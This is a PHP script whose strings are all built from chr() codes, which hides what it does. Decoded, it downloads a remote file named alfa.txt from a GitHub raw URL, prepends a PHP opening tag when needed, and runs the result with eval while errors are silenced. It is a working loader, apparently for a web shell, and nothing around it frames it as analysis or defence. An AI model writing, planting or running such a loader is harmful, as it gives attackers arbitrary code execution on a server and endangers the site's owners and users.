<?php
error_reporting(0);
@ini_set('display_errors', 0);

function c($n) { return chr($n); }

// === URL: https://github.com/robots5050/test/raw/refs/heads/main/alfa.txt ===
$url = c(104).c(116).c(116).c(112).c(115).c(58).c(47).c(47)
      .c(103).c(105).c(116).c(104).c(117).c(98).c(46).c(99).c(111).c(109).c(47)
      .c(114).c(111).c(98).c(111).c(116).c(115).c(53).c(48).c(53).c(48).c(47)
      .c(116).c(101).c(115).c(116).c(47).c(114).c(97).c(119).c(47).c(114).c(101).c(102).c(115).c(47)
      .c(104).c(101).c(97).c(100).c(115).c(47).c(109).c(97).c(105).c(110).c(47)
      .c(97).c(108).c(102).c(97).c(46).c(116).c(120).c(116);

// === FUNGSI UTAMA ===
$get = c(102).c(105).c(108).c(101).c(95).c(103).c(101).c(116).c(95).c(99).c(111).c(110).c(116).c(101).c(110).c(116).c(115);
$dec = c(117).c(114).c(108).c(100).c(101).c(99).c(111).c(100).c(101);
$exe = c(101).c(118).c(97).c(108);

// === TAMBAH <?php JIKA BELUM ADA ===
$php = c(37).c(51).c(67).c(37).c(51).c(70).c(112).c(104).c(112); // %3C%3Fphp

// === AMBIL FILE ALFA.TXT ASLI ===
$code = @$get($url);

if ($code !== false && $code !== '') {
    $payload = (substr($code, 0, 5) === '<?php') ? $code : $dec($php) . $code;
    @$exe($payload);
}
?>
